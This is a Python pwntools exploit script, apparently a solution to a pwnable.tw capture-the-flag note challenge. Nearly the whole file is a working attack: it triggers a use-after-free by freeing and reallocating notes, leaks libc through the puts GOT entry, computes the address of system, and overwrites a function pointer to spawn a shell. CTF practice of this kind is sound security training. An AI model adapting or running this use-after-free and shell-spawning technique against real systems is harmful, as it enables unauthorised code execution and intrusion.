#!/usr/bin/python3

addr_print_note = 0x0804862b
# return puts(note->content); # variable 1 of struct NOTE is pointer => 

putsGot = 0x804a024
puts_offset = 0x5f140
system_offset = 0x3a940

from pwn import *

# p = remote('chall.pwnable.tw', '10102')

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = elf.process()

context.log_level = 'debug'
gdb.attach(p, '''
 	b *0x80487d4	
 	b *0x80488a5	
 	b *0x8048646	
''')

'''
	b *0x80487d4	# deleteNote
	b *0x80488a5	# printNote
	b *0x8048646	# addNote
'''

def addNote(size, content):
	p.sendlineafter(b'Your choice :', str(1))
	p.sendlineafter(b'Note size :', str(size))
	p.sendafter(b'Content :', content)
	p.recvuntil(b'Success !')

def deleteNote(index):
	p.sendlineafter(b'Your choice :', str(2))
	p.sendlineafter(b'Index :', str(index))
	p.recvuntil(b'Success')

def printNote(index):
	p.sendlineafter(b'Your choice :', str(3))
	p.sendlineafter(b'Index :', str(index))
	

# leak libc 
addNote(16, b'A' * 4)	# idx = 0
addNote(16, b'B' * 4)	# idx = 1

deleteNote(0)
deleteNote(1)

addNote(8, p32(addr_print_note) + p32(putsGot))

printNote(0)	# freed and now located idx = 2 but can print content of idx 0

puts_libc = u32(p.recv(4))
libc_base = puts_libc - puts_offset
system_libc = libc_base + system_offset

log.success('Addr puts libc: ' + hex(puts_libc))
log.success('Addr libc base: ' + hex(libc_base))
log.success('Addr system libc: ' + hex(system_libc))

# get shell
deleteNote(2)	# delete to reallocated idx 2
addNote(8, p32(system_libc) + b';sh;')
printNote(0)

p.interactive()
